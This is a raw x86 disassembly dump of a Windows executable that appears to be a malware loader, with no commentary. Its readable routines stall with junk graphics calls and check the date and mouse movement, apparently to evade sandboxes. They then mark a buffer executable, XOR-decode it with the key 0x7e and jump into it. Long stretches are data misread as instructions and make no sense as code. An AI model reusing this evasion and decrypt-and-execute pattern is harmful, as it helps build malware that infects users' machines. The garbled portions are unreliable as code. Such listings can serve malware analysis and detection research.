add eax [ eax ]
inc esi
add al dh
fiadd [ edx ]
mov ah 0x90
inc esi
add [ esi + edi * 2 ] dl
inc esi
add [ ebp + edi * 4 + 0x42 ] bl
add ah ah
mov edx 0xb7f40042
inc edx
add [ ecx + eax * 8 + 0x42 ] bh
add [ eax + r-xdata ] dl
pop es
push es
push esp
inc esi
outsd
jb r-xdata
add [ eax - 0x43ffbcaa ] ch
mov bh 0x44
add [ edx + eax * 8 ] bh
js r-xdata
or [ ebx + 0x68 ] al
popad
jb r-xdata
xor [ ebx ] al
add [ eax ] al
or al 0x0
or [ ebx + 0x68 ] eax
arpl [ gs : ebx + 0x42 ] bp
outsd
js r-xdata
outsb
xor [ eax ] ebx
add eax [ eax ]
add [ eax + eax ] al
or eax [ esi + 0x6f ]
add [ eax ] cl
add [ ebx ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
xor [ eax ] esp
add eax [ eax ]
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x32031
arpl [ ecx + ebp * 2 + 0x6f ] si
jae r-xdata
inc edi
add [ ebx ] dh
rcl [ ebp + 0x68 ] 0x19
sti
inc esi
add [ edi + edi * 8 + 0x30 ] ah
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax ebx
cmc
inc esi
add [ edi + edx * 2 ] cl
inc ebp
add [ esi ] bl
add eax 0x74696e55
jb r-xdata
outsb
je r-xdata
imul esp [ ecx + 0x6c ] 0x3831676f
mov esp 0x3c0044b7
retn 0x46
imul esp [ ecx + 0x6c ] 0x4031676f
add eax [ eax ]
add [ eax ] dl
add [ esi ] cl
push edx
jo r-xdata
inc esp
add eax [ eax ]
add [ esi ] cl
add [ ebx ] cl
xor al 0x3
add [ eax ] al
or eax 0x72500c00
imul ebp [ esi + 0x74 ] 0x6c616944
outsd
xor [ bx + si ] edi
cmp eax [ ebx ]
push 0x9c00435f
dec edx
inc ebx
add [ eax - 0x57ffbd1e ] al
imul esp [ ecx + 0x6c ] 0x3c31676f
add eax [ eax ]
or eax [ ecx + 0x63 ]
je r-xdata
inc edx
popad
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fb20
retn
mov [ ebx ] 0x1
add ch [ esi ]
xor al 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
add [ eax ] al
add [ eax + edx + 0x40 ] ch
add [ 0x74696e55 ] al
xor [ ebx - 0x1374aa40 ] ecx
xor eax eax
push ebp
push j_sub_403a3c#2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f8cc
retn
xor [ ecx ] edx
add al al
pop es
inc ebx
add [ ebp + ecx - 0x21fffbd ] ah
inc edx
add [ eax + 0x6800433b ] al
pop edi
inc ebx
add [ edx + ecx * 2 - 0x1d7fffbd ] bl
inc edx
xor [ eax ] eax
add [ ebx + 0x46f884c0 ] cl
add [ ecx ] dl
pop esi
add [ 0x74696e55 ] al
popad
arpl [ ebp + 0x44 ] sp
imul esp [ ecx + 0x6c ] 0x631676f
push esp
inc esi
outsd
inc esi
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x32432
add [ ecx ] cl
add [ 0x43656c4f ] cl
outsd
outsb
je r-xdata
outsd
add [ esi ] al
push eax
popad
outsb
insb
xor [ ebx + eax ] edx
add [ eax ] al
pop es
add [ edi ] al
inc edx
jne r-xdata
add al 0x3
add [ eax ] al
add eax [ eax ]
add eax 0x74696445
xor [ eax ] ecx
add eax [ eax ]
add [ eax + eax ] al
or [ ebx + 0x68 ] eax
arpl [ gs : ebx + 0x42 ] bp
outsd
js r-xdata
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call StretchBlt
nop
nop
inc [ ebx ]
cmp [ ebx ] 0x20c1
jne r-xdata
nop
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
or al 0x3
push 0x0
push 0x0
call SetAbortProc
call GetLastError
mov [ rw-data ] eax
nop
nop
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e0
jae r-xdata
nop
jmp r-xdata
nop
cmp [ rw-data ] 0x6
je r-xdata
nop
nop
jmp r-xdata
mov [ ebx ] 0x1
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call StretchBlt
inc [ ebx ]
cmp [ ebx ] 0x8708
jne r-xdata
nop
nop
nop
nop
nop
mov eax 0x1ca02bfd
call sub_40276c
mov ecx eax
nop
nop
test ecx ecx
je r-xdata
mov [ ebx ] 0x1
nop
nop
mov eax [ ebx ]
inc eax
mov esi 0x88
xor edx edx
div esi
mov eax ecx
add eax [ ebx ]
mov [ eax ] dl
inc [ ebx ]
cmp [ ebx ] 0x1ca012d7
jne r-xdata
nop
mov eax ecx
call sub_40278c
nop
mov [ ebx ] 0x1
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call StretchBlt
inc [ ebx ]
cmp [ ebx ] 0x877c
jne r-xdata
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
nop
xor eax eax
mov [ ebx ] eax
nop
push rw-data
call GetCursorPos
nop
push 0x17
call sub_406490
nop
nop
cmp [ ebx ] 0x4
jbe r-xdata
inc [ ebx ]
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
push rw-data
call GetCursorPos
nop
nop
mov eax [ rw-data ]
sub eax [ rw-data ]
cmp eax 0x1c
jbe r-xdata
nop
mov eax rw-data
mov edx rw-data
mov ecx [ r-xdata ]
call sub_4052b8
nop
cmp [ rw-data ] 0x0
jne r-xdata
nop
push ebx
mov ecx 0x40
mov edx 0x5f50
mov eax [ rw-data ]
call [ rw-data ]
xor eax eax
mov [ ebx ] eax
nop
jmp r-xdata
mov eax [ rw-data ]
add eax [ ebx ]
mov al [ eax ]
xor al 0x7e
mov edx [ rw-data ]
add edx [ ebx ]
mov [ edx ] al
inc [ ebx ]
cmp [ ebx ] 0x5f51
jne r-xdata
nop
nop
nop
nop
nop
push 0x347f
nop
nop
mov ecx [ rw-data ]
nop
add [ esp ] ecx
nop
nop
retn
sub_46f8d0
push ebp
mov ebp esp
push ebx
push esi
mov ebx rw-data
xor eax eax
push ebp
push sub_46fb19
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fb20
retn
mov [ ebx ] 0x1
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call StretchBlt
nop
nop
inc [ ebx ]
cmp [ ebx ] 0x20c1
jne r-xdata
nop
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
push 0x0
push 0x0
call SetAbortProc
call GetLastError
mov [ rw-data ] eax
nop
nop
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e0
jae r-xdata
nop
jmp r-xdata
nop
cmp [ rw-data ] 0x6
je r-xdata
nop
nop
jmp r-xdata
mov [ ebx ] 0x1
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call StretchBlt
inc [ ebx ]
cmp [ ebx ] 0x8708
jne r-xdata
nop
nop
nop
nop
nop
mov eax 0x1ca02bfd
call sub_40276c
mov ecx eax
nop
nop
test ecx ecx
je r-xdata
mov [ ebx ] 0x1
nop
nop
mov eax [ ebx ]
inc eax
mov esi 0x88
xor edx edx
div esi
mov eax ecx
add eax [ ebx ]
mov [ eax ] dl
inc [ ebx ]
cmp [ ebx ] 0x1ca012d7
jne r-xdata
nop
mov eax ecx
call sub_40278c
nop
mov [ ebx ] 0x1
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call StretchBlt
inc [ ebx ]
cmp [ ebx ] 0x877c
jne r-xdata
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
nop
xor eax eax
mov [ ebx ] eax
nop
push rw-data
call GetCursorPos
nop
push 0x17
call sub_406490
nop
nop
cmp [ ebx ] 0x4
jbe r-xdata
inc [ ebx ]
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
push rw-data
call GetCursorPos
nop
nop
mov eax [ rw-data ]
sub eax [ rw-data ]
cmp eax 0x1c
jbe r-xdata
nop
mov eax rw-data
mov edx rw-data
mov ecx [ r-xdata ]
call sub_4052b8
nop
cmp [ rw-data ] 0x0
jne r-xdata
nop
push ebx
mov ecx 0x40
mov edx 0x5f50
mov eax [ rw-data ]
call [ rw-data ]
xor eax eax
mov [ ebx ] eax
nop
jmp r-xdata
mov eax [ rw-data ]
add eax [ ebx ]
mov al [ eax ]
xor al 0x7e
mov edx [ rw-data ]
add edx [ ebx ]
mov [ edx ] al
inc [ ebx ]
cmp [ ebx ] 0x5f51
jne r-xdata
nop
nop
nop
nop
nop
push 0x347f
nop
nop
mov ecx [ rw-data ]
nop
add [ esp ] ecx
nop
nop
retn
sub_46fb9c
inc edi
add [ eax ] al
add [ ebx + edi * 8 + 0x61180046 ] ah
inc eax
add al ch
pushad
inc eax
add [ edi + ebx * 2 ] cl
inc eax
add [ eax - 0x57ffbfa2 ] bh
popad
inc eax
add [ eax + 0x61 ] bh
inc eax
add [ eax ] cl
outsd
inc eax
add al bl
outsb
inc eax
add [ eax + 0x6f ] al
inc eax
add [ eax ] dl
outsd
inc eax
add al al
dec edx
inc ecx
add [ eax + 0x5000414a ] dl
jb r-xdata
add [ ebp + edi * 2 - 0x68e3ffbe ] ah
add [ eax ] ah
jb r-xdata
mov ah 0x42
add [ eax - 0x4c ] bh
inc edx
add [ ecx + edi * 2 ] cl
inc edx
add [ eax - 0x1f ] bl
inc esp
add [ eax ] ch
loope r-xdata
inc edx
add ah bl
xchg esi eax
inc edx
add ah ah
xchg [ edx ] al
mov ah 0x86
inc edx
add [ edi + edi * 2 + 0x42 ] ah
add [ edi + edi * 2 ] dh
inc edx
add [ edi ] ch
inc ecx
add ah bh
out 0x41 al
add al ah
jns r-xdata
add [ edi + edx * 4 ] bl
add [ edi + edx * 8 ] ch
inc eax
add [ ebp + edx * 8 - 0x2067ffc0 ] ch
inc eax
add [ eax - 0x21 ] ch
inc eax
add [ esp + edi ] bl
inc ecx
add [ ebx + edi + 0x3de00041 ] ah
inc ecx
add [ eax - 0x37ffbec3 ] dh
inc ebp
inc ecx
add [ eax + 0x45 ] bh
inc ecx
add [ eax - 0x1d ] dh
inc ecx
add al al
loop r-xdata
add [ eax ] ch
mov ch 0x42
add [ ebp + edi * 8 - 0x2a3ffbe ] cl
inc edx
add [ ecx + ebx * 4 + 0x43 ] dh
add [ ecx + ebx * 4 + 0x43 ] al
add [ edi + edx * 4 + 0x42 ] dh
add [ edi + edx * 4 + 0x42 ] al
add [ eax - 0x5b ] dl
inc edx
add [ 0xffffffffb5b80042 ] dl
inc edx
add [ eax - 0xfffbd4b ] cl
mov ch 0x42
add al al
mov ch 0x42
add [ eax + 0x540042da ] dh
fiadd [ edx ]
pop esp
stc
inc edx
add [ ecx + edi * 8 ] dl
inc edx
add [ eax - 0x4c ] al
inc edx
add [ eax ] dl
mov ah 0x42
add [ eax ] cl
mov ah 0x42
add al bl
mov bl 0x42
add [ eax ] ch
cld
inc edx
add al ah
sti
inc edx
add [ eax + 0x480042fc ] dl
cld
inc edx
add [ eax - 0x5 ] ch
inc edx
add [ eax ] dh
sti
inc edx
add al al
sti
inc edx
add [ eax - 0x6fffbd05 ] dl
cli
inc edx
add [ eax - 0x6 ] ah
inc edx
add [ eax ] cl
cli
inc edx
add ah cl
stc
inc edx
add ah bl
0x9aac0043 0x43
cld
cld
inc edx
add [ esp + edi * 8 - 0x2abffbe ] ch
inc edx
add [ edi * 8 - 0x63bffbe ] al
inc edx
add [ ecx + edi * 8 + 0x2f640042 ] dl
inc ebx
add ah ch
inc ebx
add [ eax + 0x39 ] dh
inc ebx
add [ ecx + edi ] ch
inc ebx
add [ esp + esi * 4 - 0x4bd3ffbc ] dl
inc esp
add [ eax - 0x36 ] dl
inc esp
add [ eax ] ah
0x44
add [ eax - 0x4c ] cl
inc edx
add [ eax - 0x4b ] bl
inc edx
add [ edi + eax * 4 ] ah
inc edx
add ah dh
xchg [ edx ] al
sbb [ ecx + 0x45 ] cl
and al 0x87
add [ ebx + edi * 2 ] bl
inc edx
add ah ch
jpe r-xdata
add [ eax + 0x14004548 ] ch
stosb [ edi ]
dec ecx
inc ebp
add ah dl
jge r-xdata
inc edx
add ah ah
test eax 0xb3bc0042
inc edx
add [ eax - 0x4d ] ch
inc edx
add [ eax ] ah
mov ch 0x42
add al dh
mov ah 0x42
add al ch
mov ah 0x42
add [ eax - 0x4fffbd4c ] bh
mov ah 0x42
add [ eax + 0x780042b4 ] al
mov ah 0x42
dec eax
inc ebp
add [ edx + ebp * 4 ] dl
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_46fb9c
call sub_4060a4
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45f810
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_45f828
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45f8a8
call sub_403f48
sub_4011f2
call [ eax + 0x244483cc ]
add al 0xf8
jmp sub_4059d4
sub_4011ff
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4059fc
sub_401209
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405a10
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_4012dc
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
FindClose
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
FindFirstFileA
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_4012f4
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
sub_401304
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40130c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401314
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40131c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ __import_lookup_table_0(kernel32:GetStartupInfoA) ]
sub_40133c
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
sub_401354
jmp [ __import_lookup_table_0(kernel32:MultiByteToWideChar) ]
sub_40135c
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ __import_lookup_table_0(kernel32:WideCharToMultiByte) ]
sub_40137c
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ SysAllocStringLen@IAT ]
SysReAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysReAllocStringLen) ]
sub_401394
jmp [ __import_lookup_table_3(oleaut32:SysFreeString) ]
InterlockedIncrement
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
InterlockedDecrement
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_4013ac
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_4013bc
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_4013e0
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
VirtualFree
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401400
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401408
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401410
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401418
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401b62
jmp sub_403a3c
sub_401b69
mov al [ rw-data ]
pop ebp
retn
sub_401c46
jmp sub_403a3c
sub_401d14
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402328
retn
sub_402314
jmp sub_403a3c
sub_4024ba
jmp sub_403a3c
sub_402759
jmp sub_403a3c
sub_40281c
call sub_406058
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_406058
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_402870
mov [ rw-data ] edx
call sub_404020
sub_4028d4
push eax
push edx
push ecx
call sub_406058
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_4028c8
retn
sub_4028f0
retn
sub_402944
retn
sub_402948
push ebx
call sub_406058
mov ebx [ eax + 0x4 ]
call sub_406058
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402b00
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402b10
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402b88
mov edx [ eax + 0x1c ]
call sub_402b40
retn
sub_402df0
mov ecx 0xff
call sub_402dfc
retn
sub_402e20
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402e3c
jmp sub_402e3c
sub_402e39
retn
sub_4031c9
jmp sub_403a3c
sub_40321c
fninit
fwait
fldcw [ rw-data ]
retn
sub_403274
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_403280
push ebx
mov ebx eax
mov eax ebx
call sub_4032b0
call sub_40276c
mov edx eax
mov eax ebx
call sub_4032f4
pop ebx
retn
sub_40329c
push ebx
mov ebx eax
mov eax ebx
call sub_40334c
mov eax ebx
call sub_40278c
pop ebx
retn
sub_4032b0
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_4032d8
call sub_403674
test dl dl
jle r-xdata
retn
call sub_40365c
sub_403398
retn
sub_403420
jmp sub_403a3c
sub_403427
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_403530
mov eax 0x8000ffff
retn
sub_403538
retn
sub_40353c
retn
sub_403540
retn
sub_403635
jmp sub_403788
sub_40363a
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403a9c
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_40365c
sub_40365c
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_403664
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_403674
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_403684
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_40374c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_403768
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403b35
retn
sub_403c78
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403d06
jmp sub_403788
sub_403d66
jmp sub_403788
sub_403d80
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403c78
mov [ rw-data ] 0x0
call sub_403d20
retn
sub_403eb9
retn
sub_40401b
pop ebp
pop edi
pop esi
pop ebx
retn
sub_404020
mov [ rw-data ] eax
call sub_403f48
sub_40425c
retn
sub_404298
retn
sub_4042a6
retn
sub_4042bf
retn
sub_4042d0
retn
sub_4043b7
retn
sub_4044e8
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_404504#2
jmp sub_404504
sub_40454d
retn
sub_404555
retn
sub_404597
retn
sub_4046f0
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_4028c8
sub_404708
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call sub_401394
sub_404860
retn
sub_404872
retn
sub_404a68
mov ecx 0x1
jmp sub_4049d4
sub_404a72
retn
sub_404aa8
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_4028c8
call [ rw-data ]
retn
sub_404bac
mov ecx 0x1
jmp sub_404ac0
sub_404bb6
retn
sub_404bb8
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_4028c8
call [ rw-data ]
retn
sub_404dde
retn
sub_404de0
push edx
call sub_40276c
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_404a68
pop eax
sub_404df4
push eax
call sub_404bac
pop eax
call sub_40278c
retn
sub_404e04
xchg ecx eax
xchg edx ecx
call sub_404194
retn
sub_404e58
mov al 0x11
jmp sub_4028c8
sub_404e83
retn
sub_4050c4
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404cec
pop ebp
retn 0x4
j_sub_404ac0
jmp sub_404ac0
sub_4050d9
retn
sub_4050dc
call sub_40527c
retn
sub_405308
call sub_4052e0
retn
sub_405651
jmp sub_403a3c
sub_4057bc
call sub_4057cc
retn
sub_4057c4
call sub_4057ec
retn
sub_4057cc
push ebx
mov ebx eax
mov eax 0x8
call sub_40276c
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_405887
jmp sub_403788
sub_4058a8
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_40591c
jmp sub_403a3c
sub_405923
pop ecx
pop ebp
retn
sub_40599c
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_4059a8
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_4059b4
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_4028c8
sub_4059c4
call sub_403280
mov [ eax + 0x4 ] 0x1
retn
sub_4059fc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_405ceb
jmp sub_403a3c
sub_405cf2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405d8f
jmp sub_403a3c
sub_405d96
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405ddf
jmp sub_403a3c
sub_405de6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405eaa
jmp sub_403a3c
sub_405eb1
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405f02
jmp sub_403a3c
sub_405f09
pop ebp
retn
sub_405fe0
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ LocalAlloc@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
sub_406000
push eax
push 0x40
call LocalAlloc
retn
sub_40600c
mov eax 0x10
retn
sub_406098
mov eax rw-data
call sub_4058a8
retn
sub_40610d
jmp sub_403a3c
sub_406114
pop ebp
retn
sub_406118
sub [ rw-data ] 0x1
retn
sub_406120
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_40613c
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_406144
test eax eax
je r-xdata
xor eax eax
retn
add [ eax ] edx
add [ eax + 0x8 ] edx
add [ eax + 0x4 ] ecx
add [ eax + 0xc ] ecx
mov al 0x1
retn
sub_40619d
jmp sub_403a3c
sub_4061a4
pop ebp
retn
sub_4061a8
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyExA
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ CompareStringA@IAT ]
CreateFileA
jmp [ CreateFileA@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
FindResourceA
jmp [ __import_lookup_table_6(kernel32:FindResourceA) ]
FormatMessageA
jmp [ __import_lookup_table_6(kernel32:FormatMessageA) ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetComputerNameA
jmp [ GetComputerNameA@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ __import_lookup_table_6(kernel32:GetLocaleInfoA) ]
GetProfileStringA
jmp [ GetProfileStringA@IAT ]
GetStringTypeExA
jmp [ GetStringTypeExA@IAT ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetUserDefaultLCID
jmp [ GetUserDefaultLCID@IAT ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ __import_lookup_table_6(kernel32:GetVersionExA) ]
GlobalAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalAlloc) ]
GlobalFindAtomA
jmp [ __import_lookup_table_6(kernel32:GlobalFindAtomA) ]
GlobalHandle
jmp [ __import_lookup_table_6(kernel32:GlobalHandle) ]
GlobalReAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalReAlloc) ]
GlobalSize
jmp [ __import_lookup_table_6(kernel32:GlobalSize) ]
LeaveCriticalSection
jmp [ __import_lookup_table_6(kernel32:LeaveCriticalSection) ]
LoadLibraryA
jmp [ __import_lookup_table_6(kernel32:LoadLibraryA) ]
LoadResource
jmp [ LoadResource@IAT ]
LockResource
jmp [ LockResource@IAT ]
ReadFile
jmp [ ReadFile@IAT ]
ResetEvent
jmp [ __import_lookup_table_6(kernel32:ResetEvent) ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetEvent
jmp [ SetEvent@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_406490
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
VirtualAlloc
jmp [ __import_lookup_table_6(kernel32:VirtualAlloc) ]
VirtualQuery
jmp [ __import_lookup_table_6(kernel32:VirtualQuery) ]
WaitForSingleObject
jmp [ __import_lookup_table_6(kernel32:WaitForSingleObject) ]
WinExec
jmp [ WinExec@IAT ]
lstrcpyA
jmp [ __import_lookup_table_6(kernel32:lstrcpyA) ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoSizeA) ]
VerQueryValueA
jmp [ __import_lookup_table_7(version:VerQueryValueA) ]
CloseEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:CloseEnhMetaFile) ]
CopyEnhMetaFileA
jmp [ __import_lookup_table_8(gdi32:CopyEnhMetaFileA) ]
CreateBitmap
jmp [ __import_lookup_table_8(gdi32:CreateBitmap) ]
CreateBrushIndirect
jmp [ __import_lookup_table_8(gdi32:CreateBrushIndirect) ]
CreateDIBSection
jmp [ __import_lookup_table_8(gdi32:CreateDIBSection) ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateEnhMetaFileA
jmp [ CreateEnhMetaFileA@IAT ]
CreateHalftonePalette
jmp [ __import_lookup_table_8(gdi32:CreateHalftonePalette) ]
CreatePalette
jmp [ __import_lookup_table_8(gdi32:CreatePalette) ]
CreatePatternBrush
jmp [ __import_lookup_table_8(gdi32:CreatePatternBrush) ]
CreatePen
jmp [ __import_lookup_table_8(gdi32:CreatePen) ]
CreatePenIndirect
jmp [ __import_lookup_table_8(gdi32:CreatePenIndirect) ]
DeleteEnhMetaFile
jmp [ DeleteEnhMetaFile@IAT ]
DeleteMetaFile
jmp [ __import_lookup_table_8(gdi32:DeleteMetaFile) ]
EndDoc
jmp [ __import_lookup_table_8(gdi32:EndDoc) ]
EndPage
jmp [ EndPage@IAT ]
ExcludeClipRect
jmp [ ExcludeClipRect@IAT ]
ExtTextOutA
jmp [ ExtTextOutA@IAT ]
GetBrushOrgEx
